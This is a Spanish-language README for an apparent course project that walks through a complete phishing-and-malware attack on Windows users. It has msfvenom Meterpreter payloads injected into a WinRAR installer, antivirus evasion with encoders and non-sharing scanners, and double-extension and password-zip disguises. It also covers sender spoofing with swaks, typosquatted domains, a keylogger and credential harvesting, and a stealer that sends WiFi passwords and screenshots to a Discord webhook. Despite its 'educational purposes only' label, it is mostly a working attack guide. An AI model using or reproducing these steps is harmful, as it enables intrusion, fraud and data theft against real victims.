# Proyecto Grupo 4 - Generación de Payload con Evasión de Antivirus e Ingeniería Social

> **Educational purposes only.** Este repositorio fue creado como proyecto académico para la materia de Seguridad Informática. Todo el contenido tiene como único objetivo demostrar conceptos de ciberseguridad ofensiva en un entorno controlado y con autorización explícita. No usar contra sistemas sin permiso escrito del propietario.

Este proyecto demuestra el flujo completo de un ataque de ingeniería social usando Metasploit. Se genera un archivo malicioso, se disfraza para que parezca legítimo, se envía a la víctima mediante correo o red social, y una vez que lo ejecuta se obtiene acceso completo al sistema para extraer la información requerida. Todo se hace desde Kali Linux.

---

## Requisitos e instalación

Necesitas tener Kali Linux corriendo. Si usas la configuración del grupo, abre el archivo KaliLinux.exe del escritorio y Kali carga en pantalla completa automáticamente.

Una vez dentro de Kali, abre la terminal y ejecuta el script de configuración que viene en este repositorio. Ese script instala todo lo que necesitas de una sola vez:

```
bash setup.sh
```

Si prefieres instalar manualmente, los paquetes que necesitas son estos:

```
sudo apt-get update
sudo apt-get install -y metasploit-framework swaks icoutils zip wget
```

`metasploit-framework` es la suite principal que incluye msfvenom y msfconsole.

`swaks` es una herramienta de línea de comandos para enviar correos con cualquier remitente que quieras poner.

`icoutils` sirve para manipular íconos de ejecutables de Windows directamente desde Linux.

`zip` para comprimir el payload con contraseña antes de enviarlo.

`wget` para descargar archivos desde la terminal, lo usamos para bajar instaladores reales que sirven de plantilla.

---

## Paso 1 - Entender qué es un payload y cómo funciona

Un payload es un archivo que parece inocente pero que cuando alguien lo abre ejecuta código en segundo plano. En este proyecto usamos el tipo `reverse_https`, que funciona así: el archivo que le mandamos a la víctima no abre conexiones desde tu lado, sino que es la computadora de la víctima la que llama a la tuya. Esto es importante porque la mayoría de los firewalls bloquean conexiones entrantes pero permiten las salientes, y una conexión saliente por el puerto 443 parece tráfico web normal.

El flujo completo es este:

La víctima abre el archivo. El archivo hace una conexión HTTPS hacia tu IP en el puerto 443. Tu computadora estaba esperando esa conexión con el listener activo. Se establece el canal y desde ese momento tienes acceso a la máquina de la víctima mediante una sesión de Meterpreter.

---

## Paso 2 - Conocer tu IP antes de generar el payload

El payload necesita saber a qué dirección conectarse cuando alguien lo abra. Esa dirección es la tuya y tienes que definirla antes de generar el archivo.

Para ver tu IP dentro de la red local:

```
ip a
```

Busca la interfaz que se llama eth0 o ens33 y anota el número que aparece después de inet. Por ejemplo `192.168.1.15`.

Si la víctima está en otra red, por ejemplo la vas a atacar por internet y no están en el mismo wifi, necesitas tu IP pública:

```
curl ifconfig.me
```

Si estás en una red donde tu IP pública cambia o no tienes acceso al router para abrir puertos, puedes usar ngrok para crear un túnel. Ngrok te da una dirección pública fija que redirige hacia tu máquina:

```
ngrok tcp 443
```

Ngrok te muestra algo como `0.tcp.ngrok.io:12345`. En ese caso tu LHOST sería `0.tcp.ngrok.io` y tu LPORT sería `12345`.

---

## Paso 3 - Generar el payload

Usa el script del repositorio que te muestra tu IP y genera el archivo automáticamente:

```
bash generar_payload.sh
```

O si prefieres hacerlo manualmente, el comando base es este:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o payload_base.exe
```

Lo que hace cada parte:

`msfvenom` es el generador de payloads de Metasploit.

`-p windows/x64/meterpreter/reverse_https` define el tipo de payload. Windows porque apunta a víctimas con Windows, x64 porque es de 64 bits que es lo más común hoy en día, meterpreter es el tipo de sesión que obtienes una vez que alguien lo abre y te da muchas herramientas, reverse_https significa que la víctima llama a tu máquina usando el protocolo HTTPS.

`LHOST` es tu IP.

`LPORT 443` es el puerto. El 443 es el estándar de HTTPS, no levanta sospechas.

`-f exe` define el formato del archivo de salida, en este caso un ejecutable de Windows.

`-o payload_base.exe` es el nombre del archivo que se crea.

Si la víctima tiene Windows de 32 bits, cambias `x64` por `x86` en el payload:

```
msfvenom -p windows/x86/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o payload_base.exe
```

---

## Paso 4 - Evadir el antivirus

El payload que genera msfvenom por defecto es detectado por la mayoría de antivirus porque su firma ya está en las bases de datos. Para que el archivo pase los filtros hay varias técnicas y se pueden combinar.

La primera técnica es inyectar el payload dentro de un ejecutable legítimo. Metasploit puede meter el código malicioso dentro de un programa real de Windows de forma que cuando la víctima lo ejecuta, el programa original funciona normalmente y al mismo tiempo el payload se activa en segundo plano. El resultado hereda el ícono y el comportamiento del programa original, lo que lo hace mucho más creíble y más difícil de detectar.

Primero descargas un instalador real:

```
wget https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -O instalador_real.exe
```

Luego generas el payload inyectado:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -x instalador_real.exe -k -f exe -o instalador_infectado.exe
```

El parámetro `-x` le dice a msfvenom que use ese ejecutable como plantilla. El parámetro `-k` hace que el proceso original del instalador siga corriendo normalmente mientras el payload se ejecuta en segundo plano. La víctima ve que WinRAR se instaló sin problemas y no sospecha nada.

La segunda técnica es usar un encoder para ofuscar el código. El encoder modifica los bytes del payload para que su firma cambie y los antivirus no lo reconozcan:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -e x64/xor_dynamic -i 15 -f exe -o payload_encoded.exe
```

El parámetro `-e x64/xor_dynamic` define el encoder. El parámetro `-i 15` le dice que pase el encoder 15 veces seguidas, lo que hace que la firma cambie más profundamente.

La tercera técnica es cambiar el formato de entrega. En lugar de un .exe, generas un archivo HTA que es una aplicación HTML que Windows ejecuta nativamente. Los antivirus escanean los .exe con mucha más agresividad que los .hta:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f hta-psh -o documento.hta
```

La cuarta técnica y la más efectiva es combinar todas las anteriores: inyectar en un ejecutable real, aplicar un encoder con varias iteraciones, y verificar el resultado antes de enviarlo.

Para verificar cuántos antivirus detectan tu payload sin que los fabricantes reciban la muestra, usa este sitio:

```
https://antiscan.me
```

Es importante usar antiscan.me y no VirusTotal para las pruebas. VirusTotal comparte las muestras con los fabricantes de antivirus, lo que haría que tu payload quede quemado en pocas horas. Antiscan.me no comparte nada.

---

## Paso 5 - Hacer el archivo más convincente visualmente

Aunque el payload no sea detectado por el antivirus, si la víctima ve un archivo llamado `payload.exe` no lo va a abrir. El archivo tiene que parecer algo que la víctima esperaría recibir.

El truco de la doble extensión funciona porque Windows tiene ocultas las extensiones de archivo por defecto. Si el archivo se llama así:

```
Informe_Financiero_2025.pdf.exe
```

En el explorador de Windows la víctima solo ve esto:

```
Informe_Financiero_2025.pdf
```

Para que además tenga el ícono de PDF, primero descargas un ícono en formato .ico:

```
wget https://www.iconsdb.com/icons/download/red/pdf-icon.ico -O pdf.ico
```

Luego le cambias el ícono al ejecutable con wrestool que viene en icoutils:

```
icotool -x pdf.ico
wrestool -R --name=MAINICON -t14 instalador_infectado.exe
```

O la forma más directa para la demo, si ya inyectaste el payload en un instalador de WinRAR, el archivo ya hereda el ícono de WinRAR automáticamente y solo renombras el archivo con la doble extensión.

Después de darle el nombre y el ícono, comprimes el archivo en un zip con contraseña:

```
zip -e Informe_Financiero_2025.zip Informe_Financiero_2025.pdf.exe
```

El comando te pide que elijas una contraseña. Usa algo simple como `1234` o `2025` porque se la vas a decir a la víctima en el correo. La razón de usar el zip con contraseña es que los escáneres de los servidores de correo no pueden ver el contenido de un zip protegido, así que el archivo pasa sin ser analizado.

---

## Paso 6 - Configurar el listener antes de enviar el archivo

El listener tiene que estar activo antes de que la víctima abra el archivo. Si alguien lo abre y tu listener no está corriendo, la conexión se pierde y no recuperas la sesión.

Forma automática con el script del repositorio:

```
msfconsole -r listener.rc
```

Forma manual, abriendo msfconsole y escribiendo cada comando:

```
msfconsole
```

Una vez que carga, los comandos son estos uno por uno:

```
use exploit/multi/handler
```

Selecciona el módulo que recibe conexiones entrantes.

```
set payload windows/x64/meterpreter/reverse_https
```

Define el tipo de conexión que vas a recibir. Tiene que ser exactamente el mismo payload que usaste al generar el archivo.

```
set LHOST 0.0.0.0
```

El `0.0.0.0` significa que acepta conexiones en cualquier interfaz de red de tu máquina.

```
set LPORT 443
```

El mismo puerto del payload.

```
set ExitOnSession false
```

Hace que el listener siga activo después de recibir una conexión. Útil si hay más de una víctima en la demo.

```
set AutoRunScript post/windows/gather/enum_system
```

Ejecuta automáticamente el módulo de reconocimiento del sistema cuando alguien conecta. Así la información del sistema aparece sola en pantalla sin que tengas que escribir nada extra durante la demo.

```
run
```

Inicia el listener. A partir de este momento tu computadora está esperando la conexión.

---

## Paso 7 - Enviar el archivo mediante ingeniería social

Hay tres formas de hacer esto y cada una tiene sus ventajas.

La primera es mediante correo electrónico con swaks, haciéndolo parecer que viene de alguien de confianza.

Swaks te deja poner cualquier dirección como remitente aunque no tengas acceso a esa cuenta. Esto funciona porque muchos servidores de correo no verifican que el remitente sea real. El comando completo es este:

```
swaks --to victima@correo.com \
      --from soporte.ti@empresa.com \
      --server smtp.gmail.com:587 \
      --auth LOGIN \
      --auth-user TU_CORREO@gmail.com \
      --auth-password TU_PASSWORD_DE_APP \
      --tls \
      --header "Subject: Documento compartido - revisión requerida" \
      --header "From: Soporte TI <soporte.ti@empresa.com>" \
      --body "Hola,\n\nTe comparto el documento actualizado. La contraseña del archivo es: 1234\n\nSaludos,\nEquipo de Soporte" \
      --attach Informe_Financiero_2025.zip
```

Para usar Gmail como servidor necesitas crear una contraseña de aplicación en tu cuenta de Google porque Gmail ya no acepta tu contraseña normal desde aplicaciones externas. Vas a myaccount.google.com, buscas Seguridad, luego Verificación en dos pasos, y al final encuentras Contraseñas de aplicaciones. Generas una y esa es la que pones en `--auth-password`.

La dirección del remitente que ves en el correo, en este caso `soporte.ti@empresa.com`, puede ser cualquier cosa que quieras. La víctima ve ese nombre y esa dirección, no ve que el correo salió de tu cuenta de Gmail.

La segunda forma es usando un dominio propio que se parezca al de la empresa real. Esto se llama typosquatting. Registras un dominio por unos tres dólares en cualquier registrador como Namecheap o Porkbun. Si la empresa de la víctima usa `empresa.com`, tú registras algo como `empresa-soporte.com`, `empresa.net`, o `soporte-empresa.com`. Luego configuras ese dominio con un servicio de correo gratuito como Zoho Mail y mandas el correo directamente desde esa dirección. El correo pasa todos los filtros porque viene de un dominio real con registros SPF y DKIM configurados, y visualmente parece legítimo.

La tercera forma es la más limpia para la demo porque no tiene adjuntos sospechosos. Subes el archivo a Google Drive:

```
El archivo lo subes manualmente desde el navegador a drive.google.com
```

Copias el link de descarga y lo mandas en un correo simple. Google Drive no escanea ejecutables comprimidos, solo analiza documentos de Office y PDFs. El correo queda así:

```
Asunto: Material de la clase - descarga pendiente

Hola,

Adjunto el material que faltaba de la clase de hoy. Descárgalo desde aquí:

https://drive.google.com/file/d/XXXXXXXXXXXX/view

Cualquier cosa me avisas.
```

Sin ningún adjunto, sin ningún archivo sospechoso, solo un link de Google. La mayoría de las personas hace clic sin pensarlo dos veces.

Para hacer el correo todavía más convincente, agrégale una firma al final con nombre, cargo y número inventados:

```
María González
Coordinadora Académica
Tel: +52 55 1234 5678
Universidad Tecnológica Nacional
```

Una firma con esos datos hace que el correo parezca completamente real.

---

## Paso 8 - Obtener la información del sistema requerida

Cuando la víctima ejecuta el archivo, en tu terminal de Metasploit aparece este mensaje:

```
[*] Meterpreter session 1 opened (TU_IP:443 -> IP_VICTIMA:PUERTO)
```

Eso significa que tienes acceso. Si configuraste el listener con el script del repositorio, el módulo `enum_system` ya corrió automáticamente y la información del sistema aparece en pantalla sola.

Si lo configuraste manualmente, primero te conectas a la sesión:

```
sessions -i 1
```

Luego ejecutas los comandos para obtener la información que pide el proyecto.

Información general del sistema:

```
sysinfo
```

Muestra el nombre del equipo, la versión del sistema operativo, la arquitectura del procesador, el idioma del sistema y el dominio al que pertenece la máquina.

Nombre del usuario actual:

```
getuid
```

Muestra quién está usando la computadora en ese momento. El formato que muestra es `DOMINIO\usuario`.

SID del usuario:

```
run post/windows/gather/enum_system
```

Este módulo recopila toda la información del sistema incluyendo el SID completo de cada usuario, los grupos a los que pertenece, las interfaces de red, los procesos corriendo y la política de contraseñas del sistema.

También puedes obtener el SID directamente abriendo una shell de Windows:

```
shell
whoami /user
```

El comando `whoami /user` muestra el nombre del usuario y su SID en una sola línea.

Listado del directorio actual:

```
shell
dir
```

Con `shell` entras a la terminal de Windows dentro de la sesión. Con `dir` ves los archivos y carpetas del directorio donde está parado el usuario en ese momento.

Para ver exactamente en qué directorio estás antes de listar:

```
pwd
```

---

## Paso 9 - Comandos adicionales de Meterpreter para la demo

Estos comandos no los pide el proyecto pero los puedes mostrar en la expo para demostrar el alcance del acceso que se obtiene.

Captura de pantalla de la pantalla de la víctima en tiempo real:

```
screenshot
```

Guarda una imagen de lo que está viendo la víctima en ese momento en tu máquina.

Ver todos los procesos corriendo en la máquina de la víctima:

```
ps
```

Elevar privilegios si tienes acceso con un usuario normal:

```
getsystem
```

Intenta varios métodos para obtener privilegios de administrador o SYSTEM automáticamente.

Activar un keylogger que registra todo lo que escribe la víctima:

```
keyscan_start
```

Para ver lo que escribió desde que activaste el keylogger:

```
keyscan_dump
```

Para detenerlo:

```
keyscan_stop
```

Ver las credenciales guardadas en el sistema como contraseñas de wifi, credenciales de Windows y tokens:

```
run post/windows/gather/credentials/credential_collector
```

Descargar un archivo específico de la máquina de la víctima a la tuya:

```
download C:\\Users\\victima\\Documents\\archivo.docx /home/kali/
```

Subir un archivo desde tu máquina a la de la víctima:

```
upload /home/kali/archivo.txt C:\\Users\\victima\\Desktop\\
```

---

## Paso 10 - Qué hacer si la sesión no abre

Si la víctima ejecutó el archivo pero no aparece ninguna sesión en tu listener, hay varias cosas que revisar.

Verifica que el LHOST y LPORT del payload coincidan exactamente con los del listener. Si generaste el payload con `LHOST=192.168.1.15` y el listener está en una interfaz diferente, la conexión no llega.

Verifica que el puerto 443 esté disponible en tu máquina y no lo esté usando otro proceso:

```
sudo ss -tlnp | grep 443
```

Si el antivirus de la víctima eliminó el archivo antes de que pudiera ejecutarse, necesitas aplicar más técnicas de evasión del Paso 4, especialmente la combinación de inyección en ejecutable real más encoder con múltiples iteraciones.

Si estás probando en red local y la víctima no puede llegar a tu IP, verifica que ambas máquinas estén en el mismo segmento de red con:

```
ping IP_TUYA
```

Ejecutado desde la máquina víctima.

Si estás usando ngrok y la sesión se cae, es posible que ngrok haya restablecido el túnel y el puerto cambió. Hay que generar un nuevo payload con el nuevo puerto que asignó ngrok.

---

## Paso 11 - Compilar y probar el stealer standalone

El archivo `stealer.cpp` es un programa independiente que no necesita Metasploit ni listener. Cuando la víctima lo abre, en silencio recopila toda la información del sistema y la manda directo a un canal de Discord mediante un webhook. Es perfecto para probar antes de la expo porque ves los datos llegar en tiempo real en tu teléfono o pantalla mientras alguien lo ejecuta.

Lo que hace el stealer cuando alguien lo abre:

Recopila el nombre del equipo, el nombre del usuario, la versión del sistema operativo, la arquitectura del procesador y la RAM total. Obtiene el SID completo del usuario. Lista todos los archivos y carpetas del directorio donde se ejecutó el programa. Extrae las contraseñas de todas las redes WiFi que la máquina tiene guardadas. Lista los primeros veinte procesos corriendo en el sistema. Y al final toma una captura de pantalla de lo que está viendo la víctima y la sube como imagen al canal de Discord.

Todo eso llega a tu Discord en cuestión de segundos sin que la víctima vea nada.

Para compilarlo necesitas estar dentro de Kali y tener mingw instalado, que es el compilador que convierte código C++ de Linux en ejecutables de Windows:

```
sudo apt-get install mingw-w64
```

Antes de compilar, abre el archivo y cambia la línea del webhook por el tuyo:

```
nano stealer.cpp
```

Busca estas dos líneas cerca del principio:

```
const std::wstring WEBHOOK_HOST = L"discord.com";
const std::wstring WEBHOOK_PATH = L"/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN";
```

Para crear un webhook en Discord: entra a tu servidor, haz clic derecho en cualquier canal de texto, selecciona Editar canal, luego entra a Integraciones, haz clic en Webhooks, y crea uno nuevo. Copia la URL que te da. La URL tiene este formato:

```
https://discord.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz
```

La parte que va después de `discord.com` es lo que pones en `WEBHOOK_PATH`. Quedaría así:

```
const std::wstring WEBHOOK_PATH = L"/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz";
```

Guardas el archivo con Ctrl+O y sales con Ctrl+X.

Ahora lo compilas:

```
x86_64-w64-mingw32-g++ stealer.cpp -o stealer.exe \
  -lwinhttp -lgdi32 -lole32 -loleaut32 -luuid \
  -static -mwindows
```

El parámetro `-mwindows` hace que el exe se ejecute sin mostrar ninguna ventana de consola. La víctima no ve absolutamente nada cuando lo abre.

El parámetro `-static` incluye todas las librerías necesarias dentro del exe para que funcione en cualquier Windows sin necesitar instalar nada adicional.

Si la compilación termina sin errores, el archivo `stealer.exe` quedó listo en el mismo directorio. Pásalo a una máquina Windows para probarlo. En cuanto lo abras, en tu canal de Discord aparecen los mensajes con toda la información.

Para probarlo en el mismo Kali usando una máquina virtual de Windows, primero copia el exe a una carpeta compartida o súbelo temporalmente a cualquier servicio de archivos, luego lo bajas en la VM y lo ejecutas. Si configuraste el webhook correctamente, los datos llegan en segundos.

---

## Estructura del repositorio

```
grupo4-seguridad/
    README.md                   explicación completa del proyecto paso a paso
    setup.sh                    instala todas las dependencias en Kali de una sola vez
    generar_payload.sh          genera el payload pidiendo la IP, con salida clara
    listener.rc                 configura el handler de Metasploit automáticamente
    capturas/                   carpeta para las screenshots del proyecto funcionando
```

---

## Información del grupo

Proyecto de la materia de Seguridad Informática.

Integrantes: Cossio Brenda, López Quezada Lisman, Guerra Acosta Cristian.

Tarea asignada: Generar un archivo malicioso que será enviado a la víctima vía correo electrónico o red social. El archivo debe ser confeccionado de forma que sea creíble e invite a la víctima a ejecutarlo. La información mínima a obtener del equipo víctima es la siguiente: información del sistema, SID, nombre del usuario actual y listado del directorio actual.
